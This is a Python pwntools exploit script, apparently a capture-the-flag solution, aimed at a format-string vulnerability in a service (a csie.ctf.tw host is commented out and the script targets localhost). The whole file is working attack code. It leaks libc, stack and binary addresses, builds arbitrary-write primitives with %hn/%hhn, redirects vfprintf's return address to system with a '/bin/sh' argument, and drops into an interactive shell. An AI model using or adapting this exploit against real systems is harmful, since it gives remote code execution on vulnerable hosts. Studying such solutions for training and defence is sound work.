from pwn import *

context.arch = 'amd64'

# host = 'csie.ctf.tw'
# port = 10136
host = '127.0.0.1'
port = 8888
r = remote(host, port)

local = True if host == '127.0.0.1' else False

if local:
    input('Press Enter to continue.')

idx_libc_csu_init = 8
idx_libc_start_main_240 = 9
idx_and_argv = 11
idx_argv = idx_and_argv + 0xd*2

__libc_start_main_off = 0x0000000000020740
system_off = 0x0000000000045390
execve_off = 0x00000000000cc770

# leak memory & stack address
r.recvuntil(':')
payload = '%' + str(idx_libc_start_main_240) + '$p'
payload += '%' + str(idx_and_argv) + '$p'
payload += '%' + str(idx_libc_csu_init) + '$p'
payload += 'x'
payload = payload.encode()
r.sendline(payload)

# leak libc address
r.recvuntil('0x')
__libc_start_main_240 = int(r.recvuntil('0x')[:-2], 16)
__libc_start_main = __libc_start_main_240 - 240
libc = __libc_start_main - __libc_start_main_off

# calculate system address
system = system_off + libc
execve = execve_off + libc
print('system        = ', hex(system))
print('execve        = ', hex(execve))

# leak argv address on stack
argv = int(r.recvuntil('0x')[:-2], 16)
print('argv          = ', hex(argv))

# calculate iter on stack
iter_i = argv - (0x7fff9bf081b8 - 0x7fff9bf080c8) + 4
vfprintf_ret = argv + 0x7ffd77a08cf8 - 0x7ffd77a08ed8
vfprintf_call = argv + 0x7ffe27f6e848 - 0x7ffe27f6efa8
print('iter_i        = ', hex(iter_i))
print('vfprintf_ret  = ', hex(vfprintf_ret))
print('vfprintf_call = ', hex(vfprintf_call))

# pick a new argv[0]
argv_0 = argv + 0x8
idx_argv_0 = idx_argv + 1

# leak buf address
__idx_libc_csu_init = int(r.recvuntil('x')[:-1], 16)
buf = __idx_libc_csu_init + (0x555555755020 - 0x555555554a80)
print('buf           = ', hex(buf))

def fmt(prev, val, idx, byte):
    if byte == 1:
        prev &= 0xff
        full = 0x100
        hn_hnn = '$hhn'
    elif byte == 2:
        prev &= 0xffff
        full = 0x10000
        hn_hnn = '$hn'
    ret = ''
    if val > prev:
        ret = '%' + str(val - prev) + 'c'
    elif val < prev:
        ret = '%' + str(full + val - prev) + 'c'
    ret += '%' + str(idx) + hn_hnn
    return ret.encode()

def fmt_send_recv(val, idx, byte):
    payload = fmt(0, val, idx, byte)
    r.recvuntil(':')
    r.send(payload)
    r.recvn(val)

def fmt_make_new_addr(addr):
    """Make a new address on idx_argv_0."""
    global idx_argv
    global idx_and_argv
    global argv_0

    fmt_send_recv(addr & 0xffff, idx_argv, 2)

    fmt_send_recv((argv_0+0x2) & 0xff, idx_and_argv, 1)
    fmt_send_recv((addr>>0x10) & 0xffff, idx_argv, 2)

    fmt_send_recv((argv_0+0x4) & 0xff, idx_and_argv, 1)
    fmt_send_recv((addr>>0x20) & 0xffff, idx_argv, 2)

    fmt_send_recv((argv_0+0x6) & 0xff, idx_and_argv, 1)
    fmt_send_recv(0x10000, idx_argv, 2)

    fmt_send_recv(argv_0 & 0xff, idx_and_argv, 1)

def fmt_write_to_addr(val, addr):
    global idx_argv_0

    fmt_make_new_addr(addr)
    fmt_send_recv(val & 0xffff, idx_argv_0, 2)

    fmt_make_new_addr(addr+2)
    fmt_send_recv((val>>0x10) & 0xffff, idx_argv_0, 2)

    fmt_make_new_addr(addr+4)
    fmt_send_recv((val>>0x20) & 0xffff, idx_argv_0, 2)

    fmt_make_new_addr(addr+6)
    fmt_send_recv((val>>0x30) & 0xffff, idx_argv_0, 2)

# make more loop
if local:
    input('Make more loop.')
# TODO: make this more robust by overwriting more bytes
fmt_send_recv(iter_i&0xffff, idx_and_argv, 2)
fmt_send_recv(0xffff, idx_argv, 2)

# pick new argvs
argv_1 = argv + 0x10
idx_argv_1 = idx_argv + 2
argv_2 = argv + 0x18
idx_argv_2 = idx_argv + 3

if local:
    input('make argv[1] be vfprintf_ret')
fmt_send_recv(argv_1&0xffff, idx_and_argv, 2)
fmt_make_new_addr(vfprintf_ret)

if local:
    input('make argv[2] be vfprintf_ret+1')
fmt_send_recv(argv_2&0xffff, idx_and_argv, 2)
fmt_make_new_addr(vfprintf_ret+1)

# input('make argv[2] be buf')
fmt_send_recv(argv_0&0xffff, idx_and_argv, 2)
# fmt_make_new_addr(buf)

# replace vfprintf_ret with system, and put in '/bin/sh'
if local:
    input('Write payload[0x10:] to buf.')

# create final payload
target = system
final_payload = b'/bin/sh#'
final_payload += fmt(len(final_payload), target & 0xff, idx_argv_1, 1)
final_payload += fmt(target & 0xff, (target>>0x8) & 0xffff, idx_argv_2, 2)
print(len(final_payload))
final_payload = final_payload.ljust(40, b'\x00')
print(len(final_payload))
print(final_payload)

fmt_write_to_addr(u64(final_payload[0x10:0x18]), buf+0x10)
fmt_write_to_addr(u64(final_payload[0x18:0x20]), buf+0x18)
fmt_write_to_addr(u64(final_payload[0x20:0x28]), buf+0x20)

if local:
    input('=================')

r.send(final_payload[:0x10])
r.recvn((target>>0x8) & 0xffff)

r.interactive()

# b *do_system+1140
